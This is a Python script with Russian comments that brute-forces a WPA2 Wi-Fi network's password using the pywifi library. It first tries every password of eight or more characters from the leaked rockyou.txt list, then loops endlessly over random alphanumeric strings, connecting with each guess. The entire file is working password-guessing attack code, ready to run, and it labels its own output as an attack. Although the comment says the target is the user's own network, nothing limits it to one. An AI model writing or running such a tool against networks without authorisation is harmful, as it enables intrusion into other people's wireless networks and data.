import time
import string
import secrets
import pywifi
from pywifi import const

# НАСТРОЙКИ
TARGET_SSID = "My_Home_WiFi"       # Имя вашей Wi-Fi сети
DICTIONARY_PATH = "rockyou.txt"    # Путь к файлу rockyou.txt
MIN_LENGTH = 8                     # Минимальная длина пароля

def try_wifi_connect(ssid, password, iface):
    """Попытка подключения к Wi-Fi роутеру."""
    iface.disconnect()
    time.sleep(0.5)
    
    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        
        iface.connect(tmp_profile)
        time.sleep(3.5) # Время на ответ от роутера
        
        if iface.status() == const.IFACE_CONNECTED:
            return True
    return False

def smart_wifi_bruteforce():
    # Инициализация интерфейса
    wifi = pywifi.PyWiFi()
    if not wifi.interfaces():
        print("[-] Беспроводной адаптер не найден!")
        return
    iface = wifi.interfaces()[0]
    
    # База для исключения дубликатов (хэш-таблица в оперативной памяти)
    tested_passwords = set()
    attempt = 0
    
    print(f"[ * ] Старт атаки на сеть: {TARGET_SSID}")
    print(f"[ * ] Фильтр: только пароли от {MIN_LENGTH} символов.")
    print("-" * 50)

    # === ЭТАП 1: Чтение из словаря rockyou.txt ===
    print("[+] ЭТАП 1: Чтение базы rockyou.txt...")
    try:
        # Используем errors='ignore', так как в rockyou.txt бывают битые кодировки
        with open(DICTIONARY_PATH, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                password = line.strip()
                
                # Условие: длина от 8 символов
                if len(password) < MIN_LENGTH:
                    continue
                    
                # Проверка: не проверяли ли мы его раньше
                if password in tested_passwords:
                    continue
                
                tested_passwords.add(password)
                attempt += 1
                
                print(f"[Словарь] Попытка #{attempt}: Проверяем [{password}]...")
                if try_wifi_connect(TARGET_SSID, password, iface):
                    print(f"\n[+] УСПЕХ! Пароль найден в словаре: {password}")
                    return
    except FileNotFoundError:
        print(f"[-] Файл {DICTIONARY_PATH} не найден. Переходим сразу к генерации.")

    # === ЭТАП 2: Бесконечная генерация новых паролей ===
    print("\n[+] ЭТАП 2: Словарь исчерпан. Переходим к генерации уникальных паролей...")
    
    # Алфавит для генерации (строчные, заглавные буквы и цифры)
    charset = string.ascii_letters + string.digits
    
    # Скрипт будет генерировать пароли разной длины, начиная от MIN_LENGTH
    current_gen_length = MIN_LENGTH
    
    while True:
        # Генерируем случайный пароль заданной длины
        password = "".join(secrets.choice(charset) for _ in range(current_gen_length))
        
        # Защита от повторений: если такой пароль уже был в словаре или сгенерирован ранее — пропускаем
        if password in tested_passwords:
            continue
            
        tested_passwords.add(password)
        attempt += 1
        
        print(f"[Генератор] Попытка #{attempt}: Проверяем [{password}] (длина {current_gen_length})...")
        if try_wifi_connect(TARGET_SSID, password, iface):
            print(f"\n[+] УСПЕХ! Сгенерированный пароль подошел: {password}")
            return
            
        # Небольшая логика: чтобы не застревать на одной длине навсегда, 
        # каждые 50 000 генераций увеличиваем длину пароля на 1 символ
        if attempt % 50000 == 0:
            current_gen_length += 1
            print(f"[ Модификация ] Увеличиваем длину генерируемых паролей до {current_gen_length}")

if __name__ == "__main__":
    smart_wifi_bruteforce()
